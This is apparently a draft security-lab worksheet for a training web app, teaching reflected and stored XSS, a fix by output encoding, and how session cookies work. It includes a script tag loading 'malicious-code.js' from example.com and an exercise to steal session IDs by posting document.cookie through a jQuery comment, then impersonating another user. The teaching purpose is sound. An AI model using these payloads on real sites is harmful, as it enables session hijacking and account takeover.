**DRAFT**

Worksheet
========================================================================

Preparation
___________

Start the Virtual Machine and use a browser to navigate to the
web application (port 12342) and Usermin (port 12323).

After logging in, Usermin will show you the contents of ``/home/student``, from
which you can access the web application's code in the ``webapp`` folder.

The web application is a sample website designed to demonstrate
some security vulnerabilities, including those explained in this worksheet.

The first step is to familiarise with the website. You can create an
accout using the "Register" link at the top of the page. The website
allows users to login, view articles, comment them and


Unsanitised output
_____________________

Try and use the search function of the website. This page simply
searches the database for articles by their title.

In this website, the search input is not appropriately sanitised.
Notice that the search functionality of the website returns a webpage with
a heading which counts the number of results and echoes back the search
terms used (i.e. searching for ``Lorem ipsum`` will print ``4 results for "Lorem ipsum"``).

If you insert some HTML code into the input bar, you can notice that
this is not correctly filtered by the application.
For example, if you type ``<u>Hello</u>`` into the search bar and press enter,
you can see that the webpage will display the text underlined, as opposed
to displaying the string as it has been typed. This is
because the HTML ``<u>...</u>`` tag is responsible for underlining text,
and the unfiltered text is interpreted as HTML code by the browser.

**Exploit this functionality to display an arbitrary image from the internet**
**in the search page.**

Hint:
    Try searching the internet for ways to display an image in HTML.

This type of attack is known as *non-persistent*, because the result is
not saved in the website's database, and it needs the attacker to share
the link of the resulting search results page and it only affects users
which click on the malicious link.


Fix the search
______________

The webpage which is responsible for the search is available for you to
edit from Usermin in ``/home/student/webapp/pages/search.php``. You can
make changes to the file, save and reload the webpage to check the result.

If things go wrong and you want to restore the inital version of the file,
simply delete your VM and restart it from a fresh copy.

**TODO: Maybe provide something easier to reset the code?**

PHP files (``.php`` extension) contain HTML code and they may contain some PHP code
between ``<?php`` and ``?>`` tags. PHP code is processed by the server when
a webpage is requested, its output is mixed with the HTML page and only
HTML is returned to the client. Variable names start with a dollar sign (``$``) and all instructions must terminate
with a semicolon (``;``). You can learn more about the language at
http://php.net/manual/en/langref.php.

The ``prepareSearchTerm`` function is used to prepare the string before it
is used to search the articles of the website.

**Change the** ``prepareSearchTerm`` **function to fix the vulnerability.**
**Then test that the string you prepared in the previous excercise,**
**is now innocuous and can't be used to display an image.**

Hint:
    There are a couple of ways you can implement the fix to prevent
    HTML markup from being injected. Symbols, if are not
    intended to be interpreted as code, should be encoded in their
    hexadecimal HTML notation, e.g. ``£`` can be written
    as ``&#163;`` (or its memorable equivalent ``&pound;``).


Injecting Javascript Code
_________________________

Injecting simple formatting in webpages may temporarely
disrupt the layout of the webpage but is not generally a security risk.

Images can be a risk for privacy in some cases, for example if the
image is served by a webserver which is under the control of the attacker,
this can be used to retrieve information about the end user, such as
IP address, the browser used, and whether the user has opened the webpage
or not (this tecquique is known as `web beacon <https://en.wikipedia.org/wiki/Web_beacon>`_).

Probably, the most dangerous HTML code which can be injected into webpages
is Javascript code. This code is automatically executed by the web browser
as soon as it is encountered, and permits a broad range of operations, such as
the manipulation of the DOM (structure of the page), reading cookies and
sending HTTP requests.

There are two ways to insert Javascript in a HTML file:

1. Using a ``<script>...</script>`` tag, including the Javascript code directly
   in between the tags.

2. Hosting the script on different web server, and injecting it using:
   ``<script src="http://example.com/malicious-code.js"></script>``,
   where ``malicious-code.js`` is a file containing Javascript code. This
   is known **XSS**, or Cross-site scripting.

The comments section of the website is vulnerable to XSS but this time
the content of the comments is saved to the database, therefore this
application is vulnerable to *permanent XSS attacks*, which can be vary
dangerous.

**Try typing the following code in the comment box of an article, and observe**
**its effect on you and other users who visit the same page:**

.. code:: javascript

  <script> alert("Hello world"); </script>



How Sessions Work
-----------------

In order to understand identity thefth attacks, it is important to
understand how sessions work in web applications. If you already know
about sessions and cookies, feel free to skip this section.

HTTP (*Hypertext Transfer Protocol*) is the protocol used for the transmission
of webpages and is the foundation of websites and web applications. Its
development began in 1989, before modern web applications, and it was originally
designed to serve as a protocol for simple informative webpages. It is probably
for this reason that HTTP is a *stateless* protocol, meaning that its
specification has no concept of a permanent *session* between a client
and a server.

This may at first seem counterintuitive to readers,
because modern websites and web applications still use HTTP and
certainly do support authentication and other
systems that rely on the concept of the session.

**Cookies and sessions**

In order to keep track of the
current session information, most web applications use techniques such as
session cookies. Cookies are small text files which contain information that is
exchanged back and forth at every request between a client and a server.

At the first visit, the server assigns a random ID to the client, called the
session ID. This is communicated to the client. The server will store locally
any information regarding the current state of the application (the *session*
*data*), such as the authentication status of the user. The client, on the
other hand, will communicate its session ID to the server at every request,
so to receive webpages personalised on the basis of the logged in user.

The security of this method relies on the fact that the session information is
only accessible by the server, and that the session IDs are extremely
hard to guess.

You can try for yourself: most browsers allow users to view the list of cookies.
Try visiting a familiar website and logging in. At this point, you will probably
be able to see some cookie with a name such as "SESSION_ID", "SESSID" or "UID",
which will contain a long random string. Try deleting this cookie and refreshing
the webpage and you will probably be logged out of the website.


Using Javascript to steal the session ID
----------------------------------------

Javascript code has the ability to read and write cookies from and to the
browser. The cookies string can be accessed as the variable ``document.cookie``,
which contains all cookies in a key-value format (``key1=value1; key2=value2; ...``).

Most modern web browsers allow you access a Javascript interpreter,
which can be very useful for prototyping and debugging your Javascript code.
This can generally be accessed under the "Developer Tools" or "Inspector"
menus of your browser.

Open your favourite website and then this console. Typing ``document.cookie``
will probably show you a long list of cookies, which are used for statistics,
sessions, and advertisement profiling.

Intuitively, being able to read the session ID of another user and using it
on your computer, is normally enough to fool the website into believing you
are the other user: this will cause the website to log you in as the other
user.

Javascript code can be used to make HTTP requests in background. These are
known as AJAX requests. For example, you can use
Javascript to post a comment to the article with ID 1 (URL ``...&article_id=1``)
by writing:

.. code:: javascript

  jQuery.post("?page=comment.php",
              {article_id: 1, body: "My comment."});

This method, provided by the jQuery library,
makes a HTTP POST request to the URL ``/?page=comment.php`` with payload
``article_id=1`` and ``body=My comment.``. You can learn more about the
``$.post`` method at https://api.jquery.com/jquery.post/.

**Write a comment with some Javascript code that as soon as it is read,**
**will write a comment to another article, containing the cookie information**
**from the browser the user.**

Hint:
  Try combining the function presented above with the ``document.cookie``
  variable. Don't forget the ``<script></script>`` tags!

**Login with a second user and try visiting the article which has the**
**malicious comment. Verify that the**
**user unknowingly commented on the other article, publishing their session ID.**

**Try to impersonate the other user, without using their credentials.**

Hint:
  To change your session ID, you will need to edit your own cookies.
  Unfortunately, most modern browsers' developer tools allow you only
  to view and delete cookies, but not to edit them. You will need to
  download an extension for your browser in order to edit cookies.

  For example you can use Firebug for Firefox, which is available
  at https://getfirebug.com/downloads/. You can then activate the
  Firebug panel, open the Cookies tab and edit your cookies.

Generally XSS attacks rely on sending the cookies' content to a
third party web server, under the control of the attacker,
as opposed to simply publishing the cookies in the same website.
This is the reason these attacks are known as *Cross-Site*.
